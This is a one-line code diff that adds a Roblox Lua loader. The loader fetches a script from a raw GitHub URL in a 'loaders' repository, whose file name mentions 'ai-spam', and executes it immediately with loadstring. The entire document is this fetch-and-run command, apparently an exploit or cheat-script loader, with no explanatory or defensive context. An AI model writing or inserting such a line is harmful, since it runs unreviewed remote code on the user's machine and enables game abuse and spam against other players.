@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/interrogation-ai-spam1-v1utc8a2jmhmbx.lua"))()
